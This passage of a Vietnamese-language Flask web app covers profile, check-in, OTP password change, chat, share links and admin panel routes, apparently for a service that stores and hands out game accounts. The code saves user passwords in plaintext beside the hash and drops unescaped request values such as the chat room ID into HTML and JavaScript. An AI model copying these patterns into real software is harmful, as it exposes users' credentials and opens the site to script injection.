    return jsonify({"success": True, "lang": lang, "name": TRANSLATIONS[lang]["lang_name"]})

# ========== PROFILE ==========
@app.route("/profile")
@login_required
def profile():
    user = get_user()
    last_ci = user.get("last_checkin", 0); now = time.time()
    can_checkin = now - last_ci >= 86400
    ci_status = "Có thể điểm danh" if can_checkin else f"Còn {int(86400 - (now - last_ci)) // 3600}h"
    hist = user.get("history", [])
    counts = {"sss": sum(1 for h in hist if h.get("result") == "sss"),
              "ss": sum(1 for h in hist if h.get("result") == "ss"),
              "anime": sum(1 for h in hist if h.get("result") == "anime"),
              "trang": sum(1 for h in hist if h.get("result") in ("trang","normal"))}
    role_badge, role_color = get_role_badge(user["username"])
    daily_limit = user.get("daily_limit", USER_DAILY_LIMIT)
    limit_disp = "∞" if daily_limit == -1 else str(daily_limit)
    lang_flag = TRANSLATIONS.get(get_lang(), {}).get("lang_flag", "🇻🇳")
    bg_name = THEMES.get(user.get("background", "grid"), {}).get("name_vi", "?")
    accent_name = ACCENT_COLORS.get(user.get("accent", "cyan"), {}).get("name_vi", "?")
    gstats = user.get("game_stats", {})
    sd = user.get("streak_data", {})
    badges_count = len(user.get("badges", []))
    content = f'''
    <div class="card"><h2 class="card-title">◐ Thông Tin</h2>
        <div class="info-row"><span class="info-label">Role</span><span class="info-value" style="color:{role_color}; font-weight:800;">{role_badge}</span></div>
        <div class="info-row"><span class="info-label">Username</span><span class="info-value">{user['username']}</span></div>
        <div class="info-row"><span class="info-label">🏷️ Tag</span><span class="info-value" style="font-family:monospace;">{user.get('tag_code','Không có')}</span></div>
        <div class="info-row"><span class="info-label">ID</span><span class="info-value" style="font-family:monospace;">{user['id']}</span></div>
        <div class="info-row"><span class="info-label">Số dư</span><span class="info-value" style="color:#ffd700; font-weight:800;">{user.get('balance', 0)} xu</span></div>
        <div class="info-row"><span class="info-label">🎁 Lượt nhận acc</span><span class="info-value" style="color:#00ff88; font-weight:800;">{limit_disp}/ngày</span></div>
        <div class="info-row"><span class="info-label">Level</span><span class="info-value">{user.get('level', 1)} (EXP {user.get('exp', 0)})</span></div>
        <div class="info-row"><span class="info-label">Ngôn ngữ</span><span class="info-value">{lang_flag} {get_lang().upper()}</span></div>
        <div class="info-row"><span class="info-label">🎨 Nền</span><span class="info-value">{bg_name}</span></div>
        <div class="info-row"><span class="info-label">🎨 Màu chủ đạo</span><span class="info-value">{accent_name}</span></div>
        <div class="info-row"><span class="info-label">📅 Streak</span><span class="info-value" style="color:#ffb800;">{sd.get("current",0)} ngày (best: {sd.get("best",0)})</span></div>
    </div>
    <div class="card"><h2 class="card-title">🏅 Huy Hiệu <span style="color:#ffb800;">({badges_count}/{len(BADGE_DEFS)})</span></h2>
        <a href="/badges" class="btn btn-block" style="background:linear-gradient(135deg,#ffb800,#ff8800); color:#000;">🏅 Xem Huy Hiệu</a>
    </div>
    <div class="card"><h2 class="card-title">📋 Nhiệm Vụ Ngày</h2>
        <a href="/quests" class="btn btn-block" style="background:linear-gradient(135deg,#00f2fe,#00ff88); color:#000;">📋 Xem Nhiệm Vụ</a>
    </div>
    <div class="card"><h2 class="card-title">📅 Điểm Danh 7 Ngày</h2>
        <a href="/streak" class="btn btn-block" style="background:linear-gradient(135deg,#ffb800,#ff007f); color:#fff;">📅 Điểm Danh Ngay</a>
    </div>
    <div class="card"><h2 class="card-title">📺 Xem Quảng Cáo</h2>
        <a href="/ad" class="btn btn-block" style="background:linear-gradient(135deg,#00f2fe,#00ff88); color:#000;">📺 Nhận Xu Miễn Phí</a>
    </div>
    <div class="card"><h2 class="card-title">🎮 Thống Kê Game</h2>
        <div class="stat-grid-3">
            <div class="stat-box"><div class="stat-value" style="color:#00ff88;">{gstats.get("total_win",0)}</div><div class="stat-label">Thắng</div></div>
            <div class="stat-box"><div class="stat-value" style="color:#ff2951;">{gstats.get("total_lose",0)}</div><div class="stat-label">Thua</div></div>
            <div class="stat-box"><div class="stat-value" style="color:#ffd700;">{gstats.get("biggest_win",0)}</div><div class="stat-label">Big win</div></div>
        </div>
        <a href="/game" class="btn btn-block" style="margin-top:14px; background:linear-gradient(135deg,#ffb800,#ff8800); color:#000;">🎮 Vào Game Center</a>
    </div>
    <div class="card"><h2 class="card-title">★ Kho Acc</h2>
        <div class="stat-grid-4">
            <a href="/history?tab=sss" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['sss']}</div><div class="stat-label">◈ SSS</div></a>
            <a href="/history?tab=ss" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['ss']}</div><div class="stat-label">◆ SS</div></a>
            <a href="/history?tab=anime" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['anime']}</div><div class="stat-label">◇ Anime</div></a>
            <a href="/history?tab=trang" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['trang']}</div><div class="stat-label">○ Trắng</div></a>
        </div>
        <a href="/export_vip_all" class="btn btn-success btn-block" style="margin-top:14px;">📥 XUẤT VIP ALL</a>
    </div>
    <div class="card"><h2 class="card-title">🌐 Ngôn Ngữ</h2>
        <div style="display:flex; gap:8px;">
            <a href="/set_lang/vi" class="btn {'btn-success' if get_lang()=='vi' else 'btn-secondary'} btn-block" style="flex:1;">🇻🇳 Tiếng Việt</a>
            <a href="/set_lang/en" class="btn {'btn-success' if get_lang()=='en' else 'btn-secondary'} btn-block" style="flex:1;">🇬🇧 English</a>
        </div>
    </div>
    <div class="card"><h2 class="card-title">🔑 Đổi Mật Khẩu</h2>
        <a href="/my/change" class="btn btn-warning btn-block">🔐 Đổi MK Cá Nhân (OTP)</a>
    </div>
    <div class="card"><h2 class="card-title">◉ Điểm Danh</h2>
        <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{ci_status}</span></div>
        <div class="info-row"><span class="info-label">Phần thưởng</span><span class="info-value">+{DAILY_REWARD} xu</span></div>
        <form method="POST" action="/daily" style="margin-top:14px;">
            <button type="submit" class="btn btn-success btn-block" {"disabled" if not can_checkin else ""}>{"✓ Điểm Danh" if can_checkin else "◷ Đã Điểm Danh"}</button></form>
    </div>
    <div class="card"><h2 class="card-title">🚪 Đăng Xuất</h2>
        <a href="/logout" class="btn btn-danger btn-block" onclick="return confirm('Đăng xuất?');">⎋ Đăng Xuất</a>
    </div>'''
    return render_page(content, active_tab="profile", user=user)

@app.route("/daily", methods=["POST"])
@login_required
def daily():
    user = get_user(); now = time.time()
    if now - user.get("last_checkin", 0) < 86400: flash("Đã điểm danh hôm nay!", "error")
    else:
        user["balance"] += DAILY_REWARD; user["last_checkin"] = now
        save_data(); flash(f"+{DAILY_REWARD} xu!", "success")
    return redirect(url_for("profile"))

# ========== ENTER CODE ==========
@app.route("/enter_code", methods=["GET", "POST"])
@login_required
def enter_code():
    user = get_user()
    if request.method == "POST":
        code = request.form.get("code", "").strip().upper()
        if code in GENERATED_KEYS:
            k = GENERATED_KEYS[code]
            if k["remaining_uses"] > 0:
                k["remaining_uses"] -= 1
                user["balance"] = user.get("balance", 0) + k["check_count"]
                if k["remaining_uses"] <= 0: del GENERATED_KEYS[code]
                save_data(); flash(f"+{k['check_count']} lượt!", "success")
            else: flash("Code hết lượt!", "error")
        else: flash("Code không hợp lệ!", "error")
        return redirect(url_for("enter_code"))
    content = '''<div class="card"><h2 class="card-title">◆ Nhập Code</h2><form method="POST">
        <div class="form-group"><label class="form-label">Mã Code</label>
            <input type="text" name="code" class="form-input" required style="text-transform:uppercase;"></div>
        <button type="submit" class="btn btn-success btn-block">Xác Nhận</button></form></div>'''
    return render_page(content, active_tab="code", user=user)

# ========== ĐỔI MK CÁ NHÂN (OTP) ==========
@app.route("/my/change", methods=["GET", "POST"])
@login_required
def my_change_creds():
    user = get_user(); username = user["username"]
    if is_owner(username): flash("Owner dùng /owner để đổi!", "error"); return redirect(url_for("profile"))
    otp_pending = user.get("otp_pending", ""); otp_sent_at = user.get("otp_sent_at", 0)
    if otp_pending and (time.time() - otp_sent_at > OTP_EXPIRE_SEC):
        user["otp_pending"] = ""; user["otp_sent_at"] = 0; otp_pending = ""
    if request.args.get("resend") == "1" and otp_pending == username:
        otp = gen_otp(username, "self_change")
        otp_msg = f"🔐 MÃ OTP MỚI\n├─ Mã: {otp}\n├─ Hiệu lực: 5 phút\n└─ KHÔNG chia sẻ!"
        add_chat_message(f"support:{username}", "SYSTEM", otp_msg)
        threading.Thread(target=save_chat, daemon=True).start()
        user["otp_sent_at"] = time.time(); save_data(force=True)
        flash("📱 Đã gửi lại OTP!", "success")
        return redirect(url_for("my_change_creds"))
    if request.method == "POST":
        step = request.form.get("step", "request")
        old_pw = request.form.get("old_password", "")
        if step == "request":
            if hash_password(old_pw) != user.get("password"):
                flash("Mật khẩu cũ không đúng!", "error"); return redirect(url_for("my_change_creds"))
            otp = gen_otp(username, "self_change")
            otp_msg = f"🔐 MÃ OTP ĐỔI MẬT KHẨU\n├─ Mã: {otp}\n├─ Hiệu lực: 5 phút\n└─ KHÔNG chia sẻ!"
            add_chat_message(f"support:{username}", "SYSTEM", otp_msg)
            threading.Thread(target=save_chat, daemon=True).start()
            user["otp_pending"] = username; user["otp_sent_at"] = time.time()
            save_data(force=True)
            flash("📱 Đã gửi OTP vào Tin nhắn riêng!", "success")
            return redirect(url_for("my_change_creds"))
        elif step == "confirm":
            code = request.form.get("otp", "").strip(); np_ = request.form.get("new_password", "").strip()
            ok, msg = verify_otp(username, code)
            if not ok: flash(f"❌ {msg}", "error"); return redirect(url_for("my_change_creds"))
            if len(np_) < 4: flash("MK phải >= 4 ký tự!", "error"); return redirect(url_for("my_change_creds"))
            user["password"] = hash_password(np_); user["plain_password"] = np_
            user["otp_pending"] = ""; user["otp_sent_at"] = 0
            invalidate_user_sessions(username); save_data(force=True)
            flash("✅ Đổi MK thành công!", "success")
            session.clear(); return redirect(url_for("login_page"))
    otp_sent = (otp_pending == username)
    content = f'''<div class="card">
        <a href="/profile" class="btn btn-secondary btn-sm" style="margin-bottom:14px;">← Quay lại</a>
        <h2 class="card-title">🔑 ĐỔI MẬT KHẨU CÁ NHÂN</h2></div>
    <div class="card"><form method="POST">
        <input type="hidden" name="step" value="{"confirm" if otp_sent else "request"}">
        {"" if otp_sent else """
        <div class="form-group"><label class="form-label">Mật khẩu hiện tại</label>
            <input type="password" name="old_password" class="form-input" required></div>
        <div style="background:rgba(0,242,254,0.08); padding:10px; border-radius:10px; margin-bottom:10px; border:1px solid rgba(0,242,254,0.3);">
            <p style="font-size:0.82em; color:#00f2fe;">📱 OTP sẽ gửi vào Tin nhắn riêng</p></div>"""}
        {"" if not otp_sent else f"""
        <div class="form-group"><label class="form-label">Mã OTP (6 số)</label>
            <input type="text" name="otp" class="form-input" required maxlength="6" pattern="[0-9]{{6}}" placeholder="123456"></div>
        <div class="form-group"><label class="form-label">Mật khẩu mới</label>
            <input type="password" name="new_password" class="form-input" required minlength="4"></div>
        <div style="background:rgba(0,242,254,0.08); padding:10px; border-radius:10px; margin-bottom:10px;">
            <p style="font-size:0.82em; color:#00f2fe;">💬 Chưa nhận OTP? Vào <a href="/chat/support:{username}" target="_blank" style="color:#00f2fe;">tin nhắn riêng ↗</a></p></div>
        <a href="/my/change?resend=1" class="btn btn-warning btn-sm" style="margin-bottom:10px;">📱 Gửi lại OTP</a>"""}
        <button type="submit" class="btn btn-block {"btn-success" if otp_sent else ""}">
            {"🔐 Xác nhận đổi" if otp_sent else "📱 Gửi OTP"}</button></form></div>'''
    return render_page(content, active_tab="profile", user=user)

# ========== CHAT ==========
def save_chat():
    try:
        with _chat_lock: data = {"messages": CHAT_MESSAGES[-CHAT_MAX_MESSAGES:]}
        with open(CHAT_FILE + ".tmp", "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False)
        os.replace(CHAT_FILE + ".tmp", CHAT_FILE)
    except Exception as e: logger.error(f"Save chat: {e}")

def load_chat():
    global CHAT_MESSAGES
    if not os.path.exists(CHAT_FILE): return
    try:
        with open(CHAT_FILE, "r", encoding="utf-8") as f: data = json.load(f)
        CHAT_MESSAGES = data.get("messages", [])
    except Exception as e: logger.error(f"Load chat: {e}")

def chat_rate_ok(username):
    now = time.time()
    if now - _user_last_msg.get(username, 0) < CHAT_RATE_LIMIT_SEC: return False
    _user_last_msg[username] = now; return True

def add_chat_message(room_id, sender, content):
    if not content or len(content) > CHAT_MAX_LENGTH: return None
    msg = {"id": uuid.uuid4().hex[:10], "room_id": room_id, "sender": sender,
           "content": content[:CHAT_MAX_LENGTH], "timestamp": time.time(),
           "time": datetime.now().strftime("%H:%M:%S")}
    with _chat_lock:
        CHAT_MESSAGES.append(msg)
        if len(CHAT_MESSAGES) > CHAT_MAX_MESSAGES: CHAT_MESSAGES.pop(0)
    return msg

def get_room_messages(room_id, limit=100, since_ts=0):
    with _chat_lock: msgs = [m for m in CHAT_MESSAGES if m.get("room_id") == room_id]
    if since_ts > 0: msgs = [m for m in msgs if m.get("timestamp", 0) > since_ts]
    return msgs[-limit:]

def get_all_rooms_for_user(username):
    rooms = [{"id": "public", "name": t("chat_room_public"), "type": "public"},
             {"id": f"support:{username}", "name": t("chat_room_support"), "type": "support"}]
    if is_owner(username) or is_qtv(username):
        rooms.append({"id": "admin", "name": t("chat_room_admin"), "type": "admin"})
    return rooms

def get_unread_chat(username, room_id):
    u = USERS.get(username)
    if not u: return 0
    lr = u.get("chat_last_read", {}).get(room_id, 0)
    msgs = get_room_messages(room_id, limit=500)
    return sum(1 for m in msgs if m.get("timestamp", 0) > lr and m.get("sender") != username)

@app.route("/chat")
@login_required
def chat_home():
    user = get_user(); rooms = get_all_rooms_for_user(user["username"])
    html = ""
    for r in rooms:
        unread = get_unread_chat(user["username"], r["id"])
        badge = f'<span class="chat-unread">{unread}</span>' if unread > 0 else ""
        html += f'<a href="/chat/{r["id"]}" class="list-item" style="text-decoration:none;"><div style="flex:1;"><div style="font-weight:700;">{r["name"]}</div><div style="font-size:0.72em; color:var(--text-mute);">{r["type"].upper()}</div></div>{badge}<div style="color:var(--text-mute);">›</div></a>'
    content = f'<div class="card"><h2 class="card-title">{t("chat_title")}</h2><div style="display:flex; flex-direction:column; gap:10px;">{html}</div></div>'
    return render_page(content, active_tab="chat", user=user)

@app.route("/chat/<path:room_id>")
@login_required
def chat_room(room_id):
    user = get_user(); username = user["username"]
    if room_id == "admin" and not (is_owner(username) or is_qtv(username)):
        flash("Chỉ QTV!", "error"); return redirect(url_for("chat_home"))
    if room_id.startswith("support:"):
        ow = room_id.split(":", 1)[1]
        if ow != username and not is_owner(username):
            flash("Không có quyền!", "error"); return redirect(url_for("chat_home"))
    if "chat_last_read" not in user: user["chat_last_read"] = {}
    user["chat_last_read"][room_id] = time.time(); save_data()
    rn = {"public": t("chat_room_public"), "admin": t("chat_room_admin")}
    rname = t("chat_room_support") if room_id.startswith("support:") else rn.get(room_id, room_id)
    content = f'''<div class="card" style="padding:14px;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
            <a href="/chat" class="btn btn-secondary btn-sm">←</a>
            <h2 class="card-title" style="margin:0; font-size:1em;">{rname}</h2>
            <div style="width:40px;"></div></div>
        <div id="chat-box" class="chat-box"><div style="text-align:center; color:var(--text-mute); padding:20px;">{t("loading")}</div></div>
        <div class="chat-input-row">
            <input type="text" id="chat-input" class="form-input" placeholder="{t("chat_placeholder")}" maxlength="2000">
            <button onclick="sendMsg()" class="btn" style="padding:14px 18px;">➤</button></div>
    </div>
    <script>
    var roomId = "{room_id}"; var lastTs = 0; var myName = "{username}";
    function loadMessages() {{
        fetch('/api/chat/messages/' + encodeURIComponent(roomId) + '?since=' + lastTs).then(r => r.json()).then(data => {{
            if (data.error) return;
            var box = document.getElementById('chat-box');
            if (data.messages && data.messages.length > 0) {{
                if (lastTs === 0) box.innerHTML = '';
                data.messages.forEach(m => {{
                    lastTs = Math.max(lastTs, m.timestamp);
                    var isMe = m.sender === myName; var isSys = m.sender === 'SYSTEM';
                    var div = document.createElement('div');
                    div.className = 'chat-msg ' + (isSys ? 'system' : (isMe ? 'me' : 'other'));
                    div.innerHTML = '<div class="chat-meta">' + (isMe ? 'Bạn' : m.sender) + ' ' + (m.role_badge || '') + ' · ' + m.time + '</div><div class="chat-content">' + escapeHtml(m.content).replace(/\\n/g, '<br>') + '</div>';
                    box.appendChild(div);
                }});
                box.scrollTop = box.scrollHeight;
            }} else if (lastTs === 0) {{
                box.innerHTML = '<div style="text-align:center; color:var(--text-mute); padding:20px;">Chưa có tin nhắn</div>';
            }}
        }}).catch(e => console.log(e));
    }}
    function escapeHtml(t) {{ var d = document.createElement('div'); d.textContent = t; return d.innerHTML; }}
    function sendMsg() {{
        var inp = document.getElementById('chat-input'); var txt = inp.value.trim();
        if (!txt) return; inp.value = '';
        fetch('/api/chat/send/' + encodeURIComponent(roomId), {{
            method: 'POST', headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{content: txt}})
        }}).then(r => r.json()).then(d => {{ if (d.error) alert(d.error); else loadMessages(); }});
    }}
    document.getElementById('chat-input').addEventListener('keypress', function(e) {{ if (e.key === 'Enter') sendMsg(); }});
    loadMessages(); setInterval(loadMessages, 2000);
    </script>'''
    return render_page(content, active_tab="chat", user=user)

@app.route("/api/chat/messages/<path:room_id>")
@login_required
def api_chat_messages(room_id):
    user = get_user(); username = user["username"]
    if room_id == "admin" and not (is_owner(username) or is_qtv(username)): return jsonify({"error": "no"})
    if room_id.startswith("support:"):
        ow = room_id.split(":", 1)[1]
        if ow != username and not is_owner(username): return jsonify({"error": "no"})
    since = float(request.args.get("since", 0))
    msgs = get_room_messages(room_id, limit=100, since_ts=since)
    out = []
    for m in msgs:
        sender = m.get("sender", "")
        if sender == "SYSTEM":
            ow = room_id.split(":", 1)[1] if room_id.startswith("support:") else ""
            if ow != username and not is_owner(username): continue
            out.append({"sender": "SYSTEM", "content": m.get("content"),
                        "time": m.get("time"), "timestamp": m.get("timestamp"), "role_badge": ""})
            continue
        bt, bc = get_role_badge(sender)
        out.append({"sender": sender, "content": m.get("content"),
                    "time": m.get("time"), "timestamp": m.get("timestamp"),
                    "role_badge": f'<span style="color:{bc}; font-size:0.7em;">{bt}</span>' if (is_owner(sender) or is_qtv(sender)) else ''})
    return jsonify({"messages": out})

@app.route("/api/chat/send/<path:room_id>", methods=["POST"])
@login_required
def api_chat_send(room_id):
    user = get_user(); username = user["username"]
    if room_id == "admin" and not (is_owner(username) or is_qtv(username)): return jsonify({"error": "no"})
    if room_id.startswith("support:"):
        ow = room_id.split(":", 1)[1]
        if ow != username and not is_owner(username): return jsonify({"error": "no"})
    if not chat_rate_ok(username): return jsonify({"error": "Chậm thôi!"})
    data = request.get_json(silent=True) or {}
    content = (data.get("content") or "").strip()
    if not content: return jsonify({"error": "Trống"})
    if room_id.startswith("support:") and not is_owner(username): room_id = f"support:{username}"
    msg = add_chat_message(room_id, username, content)
    if not msg: return jsonify({"error": "Lỗi"})
    user["chat_count"] = user.get("chat_count", 0) + 1
    if room_id.startswith("support:") and not (is_owner(username) or is_qtv(username)):
        NOTIFICATIONS.append({"id": uuid.uuid4().hex[:10], "title": f"💬 Tin từ {username}",
            "content": content[:200], "admin": username,
            "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "timestamp": time.time()})
    threading.Thread(target=save_chat, daemon=True).start()
    return jsonify({"ok": True})

# ========== SHARE ==========
@app.route("/share/create/<hid>")
@login_required
def share_create(hid):
    user = get_user(); entry = None
    for h in user.get("history", []):
        if h.get("id") == hid: entry = h; break
    if not entry: flash("Không tìm thấy!", "error"); return redirect(url_for("history"))
    share_id = uuid.uuid4().hex[:12]
    SHARES[share_id] = {"id": share_id, "owner": user["username"],
        "acc": entry.get("acc", ""), "password": "***",
        "uid": entry.get("uid", ""), "nick": entry.get("nick", ""),
        "rank": entry.get("rank", ""), "rank_stars": entry.get("rank_stars", 0),
        "level": entry.get("level", 0), "total_skins": entry.get("total_skins", 0),
        "result": entry.get("result", ""),
        "skins_sss": entry.get("skins_sss", []), "skins_ss": entry.get("skins_ss", []),
        "skins_anime": entry.get("skins_anime", []), "skins_other": entry.get("skins_other", []),
        "created": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "timestamp": time.time()}
    save_data(force=True); flash(f"Link share: /s/{share_id}", "success")
    return redirect(url_for("share_view", sid=share_id))

@app.route("/s/<sid>")
def share_view(sid):
    share = SHARES.get(sid)
    if not share: return render_page('<div class="card"><h2>Link không tồn tại!</h2></div>', user=None)
    sss = share.get("skins_sss", []); ss = share.get("skins_ss", []); anime = share.get("skins_anime", [])
    def render_grid(lst, cls, ico, label):
        if not lst: return ""
        items = ""
        for s in lst:
            items += f'''<div class="skin-card"><div class="skin-img-wrap"><img src="{s.get('cdn','')}" loading="lazy" onerror="this.onerror=null;this.src='{s.get('cdn_fallback','')}';"></div>
                <div class="skin-info"><div class="skin-hero">{s.get('hero','?')}</div><div class="skin-name">{s.get('skin','?')}</div></div></div>'''
        return f'<div class="card"><h3 class="card-title">{ico} {label} ({len(lst)})</h3><div class="skin-grid">{items}</div></div>'
    content = f'''<div class="card" style="text-align:center;">
        <h2 class="card-title" style="justify-content:center;">ACC {share.get("result","").upper()}</h2>
        <div class="info-row"><span class="info-label">UID</span><span class="info-value">{share.get("uid","N/A")}</span></div>
        <div class="info-row"><span class="info-label">Nick</span><span class="info-value">{share.get("nick","N/A")}</span></div>
        <div class="info-row"><span class="info-label">Rank</span><span class="info-value">{share.get("rank","")} ({share.get("rank_stars",0)}★)</span></div></div>
    {render_grid(sss, "sss", "⭐", "SSS")}{render_grid(anime, "anime", "🎴", "ANIME")}{render_grid(ss, "ss", "💠", "SS")}'''
    return render_page(content, user=None)
# ========== ADMIN PANEL ==========
@app.route("/admin")
@admin_or_qtv_required
def admin_panel():
    user = get_user()
    tab = request.args.get("tab", "stats")
    if is_qtv(user["username"]) and not is_owner(user["username"]):
        if tab in ("users", "keys", "logs"):
            flash("QTV không có quyền xem mục này!", "error")
            return redirect(url_for("admin_panel"))
    body = ""
    if tab == "users":
        rows = ""
        for un, u in list(USERS.items())[:200]:
            banned_mark = "🚫" if un in BANNED_USERS else ""
            ban_btn = f'<a href="/admin/unban/{un}" class="btn btn-sm btn-success">Unban</a>' if un in BANNED_USERS else f'<a href="/admin/ban/{un}" class="btn btn-sm btn-danger">Ban</a>'
            rows += f'''<div class="list-item" style="flex-wrap:wrap;">
                <div style="flex:1; min-width:120px;">{un} {banned_mark} {"🥇" if u.get("is_owner") else ""} {"👑QTV" if u.get("is_qtv") else ""}</div>
                <div style="display:flex; gap:4px; align-items:center; flex-wrap:wrap;">
                    <form method="POST" action="/admin/add_balance" style="display:flex; gap:4px; align-items:center;">
                        <input type="hidden" name="username" value="{un}">
                        <input type="number" name="amount" placeholder="+/-" class="form-input" style="width:70px; padding:4px;">
                        <select name="mode" class="form-input" style="width:90px; padding:4px; font-size:0.75em;">
                            <option value="permanent">Vĩnh viễn</option><option value="daily">Theo ngày</option></select>
                        <button type="submit" class="btn btn-sm">+</button></form>
                    {ban_btn}</div></div>'''
        body = f'<div class="card"><h3 class="card-title">◐ Users ({len(USERS)})</h3>{rows}</div>'
    elif tab == "keys":
        rows = ""
        for k, v in GENERATED_KEYS.items():
            rows += f'''<div class="list-item"><div><div style="font-family:monospace; color:#00f2fe;">{k}</div>
                <div style="font-size:0.72em;">còn {v["remaining_uses"]} · +{v["check_count"]}</div></div>
                <form method="POST" action="/admin/delete_key" style="margin:0;">
                <input type="hidden" name="key" value="{k}"><button type="submit" class="btn btn-sm btn-danger">✕</button></form></div>'''
        body = f'''<div class="card"><h3 class="card-title">◆ Tạo Key</h3>
            <form method="POST" action="/admin/create_key">
                <div class="form-group"><label class="form-label">Tên key</label><input type="text" name="name" class="form-input" required></div>
                <div class="form-group"><label class="form-label">Lượt check</label><input type="number" name="check_count" class="form-input" required min="1"></div>
                <div class="form-group"><label class="form-label">Số lần nhập</label><input type="number" name="uses" class="form-input" required min="1"></div>
                <button type="submit" class="btn btn-block">Tạo Key</button></form></div>
            <div class="card"><h3 class="card-title">◈ Keys ({len(GENERATED_KEYS)})</h3>{rows or "Chưa có"}</div>'''
    elif tab == "notif":
        body = '''<div class="card"><h3 class="card-title">◉ Gửi Thông Báo</h3>
            <form method="POST" action="/admin/send_notification">
                <div class="form-group"><label class="form-label">Tiêu đề</label><input type="text" name="title" class="form-input" required></div>
                <div class="form-group"><label class="form-label">Nội dung</label><textarea name="content" class="form-textarea" required></textarea></div>
                <button type="submit" class="btn btn-warning btn-block">Gửi</button></form></div>'''
    elif tab == "logs":
        rows = ""
        for l in ADMIN_LOGS[-100:][::-1]:
            rows += f'<div class="info-row"><span class="info-label">{l["time"]} · {l["admin"]}</span><span class="info-value">{l["action"]} {l["target"]}</span></div>'
        body = f'<div class="card"><h3 class="card-title">📝 Admin Logs</h3>{rows or "Chưa có"}</div>'
    elif tab == "voucher":
        body = f'''<div class="card"><h3 class="card-title">🎫 Phát Voucher</h3>
            <form method="POST" action="/admin/give_voucher">
                <div class="form-group"><label class="form-label">Username</label>
                    <input type="text" name="username" class="form-input" required placeholder="Hoặc ALL để phát tất cả"></div>
                <div class="form-group"><label class="form-label">Loại voucher</label>
                    <select name="vtype" class="form-input">
                        <option value="check50">Giảm 50% check (5 lượt)</option>
                        <option value="check_free">Miễn phí check (3 lượt)</option>
                    </select></div>
                <button type="submit" class="btn btn-warning btn-block">🎫 Phát Voucher</button>
            </form></div>'''
    else:
        body = f'''<div class="card"><h2 class="card-title">◈ Thống Kê</h2>
            <div class="stat-grid"><div class="stat-box"><div class="stat-value">{len(USERS)}</div><div class="stat-label">Users</div></div>
            <div class="stat-box"><div class="stat-value">{len(ACC_STORAGE)}</div><div class="stat-label">Kho Acc</div></div>
            <div class="stat-box"><div class="stat-value">{len(GENERATED_KEYS)}</div><div class="stat-label">Keys</div></div>
            <div class="stat-box"><div class="stat-value">{len(BANNED_USERS)}</div><div class="stat-label">Banned</div></div></div></div>'''
    is_own = is_owner(user["username"])
    content = f'''<div class="tab-bar">
        <a href="/admin" class="tab-item {'active' if tab=='stats' else ''}">◈ Stats</a>
        {"" if not is_own else '<a href="/admin?tab=users" class="tab-item ' + ('active' if tab=='users' else '') + '">◐ Users</a>'}
        {"" if not is_own else '<a href="/admin?tab=keys" class="tab-item ' + ('active' if tab=='keys' else '') + '">◆ Keys</a>'}
        {"" if not is_own else '<a href="/admin?tab=voucher" class="tab-item ' + ('active' if tab=='voucher' else '') + '">🎫 Voucher</a>'}
        <a href="/admin?tab=notif" class="tab-item {'active' if tab=='notif' else ''}">◉ T.Báo</a>
        {"" if not is_own else '<a href="/admin?tab=logs" class="tab-item ' + ('active' if tab=='logs' else '') + '">📝 Logs</a>'}
    </div>{body}'''
    return render_page(content, active_tab="", user=user)

@app.route("/admin/create_key", methods=["POST"])
@owner_required
def admin_create_key():
    name = request.form.get("name", "").strip().upper()
    try: cc = int(request.form.get("check_count", 0)); us = int(request.form.get("uses", 0))
    except: flash("Số không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="keys"))
    if not name or cc <= 0 or us <= 0:
        flash("Dữ liệu không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="keys"))
    key = name
    if key in GENERATED_KEYS: key = f"{name}_{int(time.time())}"
    GENERATED_KEYS[key] = {"name": name, "remaining_uses": us, "check_count": cc,
                            "created_by": session["username"], "created_at": time.time()}
    log_admin("CREATE_KEY", key, f"+{cc} x {us}"); save_data(force=True)
    flash(f"Đã tạo: {key}", "success")
    return redirect(url_for("admin_panel", tab="keys"))

@app.route("/admin/delete_key", methods=["POST"])
@owner_required
def admin_delete_key():
    k = request.form.get("key", "")
    if k in GENERATED_KEYS:
        del GENERATED_KEYS[k]; log_admin("DELETE_KEY", k); save_data(force=True)
        flash("Đã xóa", "success")
    return redirect(url_for("admin_panel", tab="keys"))

@app.route("/admin/give_voucher", methods=["POST"])
@owner_required
def admin_give_voucher():
    un = request.form.get("username", "").strip()
    vtype = request.form.get("vtype", "check50")
    targets = []
    if un.upper() == "ALL": targets = list(USERS.keys())
    elif un in USERS: targets = [un]
    if not targets: flash("User không tồn tại!", "error"); return redirect(url_for("admin_panel", tab="voucher"))
    cfg = {"check50": {"name": "Giảm 50% check", "discount": 0, "uses": 5, "type": "check50"},
           "check_free": {"name": "Miễn phí check", "discount": 0, "uses": 3, "type": "check_free"}}[vtype]
    for u in targets:
        v = {"id": uuid.uuid4().hex[:10], "name": cfg["name"], "type": cfg["type"],
             "discount": cfg["discount"], "uses": cfg["uses"],
             "created": time.time()}
        USERS[u].setdefault("vouchers", []).append(v)
    log_admin("GIVE_VOUCHER", vtype, f"{len(targets)} users"); save_data(force=True)
    flash(f"Đã phát voucher cho {len(targets)} user!", "success")
    return redirect(url_for("admin_panel", tab="voucher"))

@app.route("/admin/add_balance", methods=["POST"])
@owner_required
def admin_add_balance():
    un = request.form.get("username", ""); mode = request.form.get("mode", "permanent")
    try: amt = int(request.form.get("amount", 0))
    except: flash("Số không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="users"))
    if un in USERS:
        if mode == "daily":
            today = datetime.now().strftime("%Y-%m-%d")
            daily_bonus = USERS[un].setdefault("daily_bonus", {})
            if daily_bonus.get("date") != today:
                daily_bonus.clear(); daily_bonus["date"] = today; daily_bonus["amount"] = 0
            daily_bonus["amount"] = daily_bonus.get("amount", 0) + amt
            log_admin("ADD_BALANCE_DAILY", un, f"+{amt} xu (hôm nay)")
            flash(f"+{amt} xu (theo ngày) cho {un}", "success")
        else:
            USERS[un]["balance"] = USERS[un].get("balance", 0) + amt
            log_admin("ADD_BALANCE_PERM", un, f"+{amt} xu (vĩnh viễn)")
            flash(f"+{amt} xu (vĩnh viễn) cho {un}", "success")
